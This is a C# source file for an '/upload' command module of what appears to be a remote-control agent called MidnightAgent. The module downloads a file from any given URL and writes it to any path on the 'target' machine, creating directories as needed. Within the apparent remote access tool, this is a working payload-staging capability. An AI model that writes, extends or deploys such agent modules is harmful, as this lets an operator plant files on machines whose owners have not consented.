using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /upload - Upload file from URL to target
    /// </summary>
    public class FileUploadFeature : IFeature
    {
        public string Command => "upload";
        public string Description => "Upload file from URL to target";
        public string Usage => "/upload <url> <filename>";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length < 2)
            {
                return FeatureResult.Fail("Usage: /upload <url> <filename>");
            }

            string url = args[0];
            string filename = string.Join(" ", args, 1, args.Length - 1);

            try
            {
                // Expand environment variables
                filename = Environment.ExpandEnvironmentVariables(filename);

                // Ensure directory exists
                string directory = Path.GetDirectoryName(filename);
                if (!string.IsNullOrEmpty(directory) && !Directory.Exists(directory))
                {
                    Directory.CreateDirectory(directory);
                }

                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(new Uri(url), filename);
                }

                var fileInfo = new FileInfo(filename);
                return FeatureResult.Ok($"✅ Uploaded: {filename}\nSize: {fileInfo.Length / 1024}KB");
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Upload failed: {ex.Message}");
            }
        }
    }
}
